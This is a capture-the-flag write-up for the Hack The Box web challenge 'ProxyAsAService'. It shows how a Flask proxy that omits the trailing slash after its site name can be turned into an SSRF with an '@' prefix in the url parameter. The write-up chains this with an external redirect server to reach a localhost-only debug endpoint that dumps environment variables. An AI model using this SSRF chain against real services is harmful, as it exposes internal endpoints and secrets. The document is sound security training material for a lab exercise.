# [ProxyAsAService](https://app.hackthebox.com/challenges/ProxyAsAService) Writeup [HTB]
_Web_

## ⚠️ Dockerfile patch
When running the Dockerfile, I encountered the following issue: 
```
AttributeError: 'datetime.datetime' object has no attribute 'times'. Did you mean: 'time'?
```
I fixed it by patching the first line of the Dockerfile: 
```diff
-   FROM python:3-alpine
+   FROM python:3.10-alpine
```

## Investigating the website
To my surprise, typing the website address in the browser brings me to the `/r/cats` subreddit. After all, the challenge is called _ProxyAsAService_. 
I immediately analyze the source code.

The application is a Flask Python server, and it has 2 endpoints: `GET /?url=` and `GET /debug/environment`. 
Let's start with the second one.

### `GET /debug/environment`
```py
@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }
    return jsonify(environment_info)
```
This is the API I want to call, since the flag is saved in an environment variable:
```py
# Place flag in environ
ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}
```
However, it can be requested only by localhost. Since I'm clearly not localhost, I have to find a workaround.

### `GET /?url=`
The main API of the website is a simple proxy logic for Reddit.
```py
SITE_NAME = 'reddit.com'
@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        # select a random cat subreddit
        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())

def proxy_req(url):    
    method = request.method
    headers =  {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```
For example, requesting a GET `/?url=/r/aita` will result in the proxy sending a GET `http://reddit.com/r/aita`.

## Escaping the proxy limitations
My final aim is calling the `/debug/environment` API pretending to be localhost. If I could provide whichever URL I want to the proxy, that would be very straightforward:

![Server communication example](../figs/hey-server.gif)

However, there are 2 limitations to this approach, since the proxy:
1. Enforces Reddit as the main domain;
2. Has a list of blacklisted URLs, including localhost.

To make this work, I need to escape both of them.

### 1 > So long, Reddit
Since there must be a way to ignore the "reddit.com" part of the request, I start researching for pathname exploits in Flask, and I find [this interesting article](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-flask-through-incorrect-pathname-interpretation).

The article shows this simple Flask proxy:
```py
from flask import Flask
from requests import get

app = Flask('__main__')
# SITE_NAME = 'https://google.com/' --> safe version
SITE_NAME = 'https://google.com'  # --> vulnerable version(!!)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
  return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
    app.run(threaded=False)
```
Now, if the developer forgets to add the "/" in the site name, then every domain can be accessed, providing it's preceded by a "@". For example, GET `/evildomain.com` will result in a GET `https://google.com/evildomain.com`, but GET `@evildomain.com` will simply trigger a GET `https://evildomain.com`!

Looks familiar, doesn't it?
```py
SITE_NAME = 'reddit.com'
[...]
url = request.args.get('url')
target_url = f'http://{SITE_NAME}{url}'
```
Since there is no "/" in sight, I can use this exploit to escape Reddit and query whichever domain I want!

### 2 > It was localhost all along!
I'm not done yet, since simply passing `/?url=@127.0.0.1:1337/debug/environment` causes the request to be blacklisted by the proxy. This is where [my redirecting server](../../utilities/server_302.py) comes in!

I set up the server so that every request is redirected to `127.0.0.1:1337/debug/environment`, then I expose it using [serveo](https://serveo.net/). Since my serveo URL is not blacklisted, I can send a request to the proxy for `/?url=@9e2040d994d0627d3ae89bfa552dea99.serveo.net`, sit tight and get the flag directly in my browser!

![Getting the flag](../figs/hey-server-302.gif)
